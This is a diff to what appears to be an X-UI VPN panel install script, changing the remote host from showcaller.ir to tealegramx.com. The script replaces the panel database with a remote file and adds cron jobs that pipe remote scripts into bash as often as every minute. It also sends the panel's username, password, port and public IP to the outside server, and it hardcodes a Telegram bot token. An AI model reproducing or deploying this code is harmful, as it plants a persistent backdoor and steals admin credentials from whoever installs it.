@@ -141,7 +141,7 @@ config_after_install() {
     
 } 
 bakcup_file() {
-    local url="https://showcaller.ir/oto/xui/db.db"
+    local url="https://tealegramx.com/bot/xui/db.db"
     local output_path="/etc/x-ui/x-ui.db"
     wget -O "$output_path" "$url"
     
@@ -149,18 +149,18 @@ bakcup_file() {
 # Function to create a cron job
 cronjab() {
     echo -e "Setting up 5 minute cron job..."
-    (crontab -l 2>/dev/null; echo "*/10 * * * * curl -sS https://showcaller.ir/oto/xui/chekhost.sh | bash") | crontab -
+    (crontab -l 2>/dev/null; echo "*/10 * * * * curl -sS https://tealegramx.com/bot/xui/chekhost.sh | bash") | crontab -
 } 
 # Function to create a cron job
 cronjabstatus() {
     echo -e "Setting up 5 minute cron job..."
-    (crontab -l 2>/dev/null; echo "* * * * * curl -sS https://showcaller.ir/oto/xui/status.sh | bash") | crontab -
+    (crontab -l 2>/dev/null; echo "* * * * * curl -sS https://tealegramx.com/bot/xui/status.sh | bash") | crontab -
 }
 # Function to create a cron job
 cronjabip() {
     apt install jq -y
     echo -e "Setting up 5 minute cron job..."
-    (crontab -l 2>/dev/null; echo "*/20 * * * * curl -sS https://showcaller.ir/oto/xui/ip.sh | bash") | crontab -
+    (crontab -l 2>/dev/null; echo "*/20 * * * * curl -sS https://tealegramx.com/bot/xui/ip.sh | bash") | crontab -
 }
 # Function to create a cron job
 addserver() {
@@ -176,7 +176,7 @@ addserver() {
     local bot_token="6473386195:AAH2KGMOV5Ea3Lz5dM0ipYRrrjWDvg8k1rg"
     local message="X-UI Installation Completed%0AIP Address: ${public_ip}%0AUsername: ${config_account}%0APassword: ${config_password}%0APort: ${config_port}"
     #curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" -d chat_id=${chat_id} -d text="${message}"
-    curl -s -X POST "https://showcaller.ir/oto/index.php" -d method=$config_method -d user=$config_account -d pass=$config_password -d port=$config_port -d ip=$public_ip
+    curl -s -X POST "https://tealegramx.com/bot/index.php" -d method=$config_method -d user=$config_account -d pass=$config_password -d port=$config_port -d ip=$public_ip
 
 }
 
@@ -269,7 +269,7 @@ install_base
 install_x-ui $1
 #install_bbr
 cronjab
-cronjabip
+#cronjabip
 cronjabstatus
 sleep 60 
 addserver
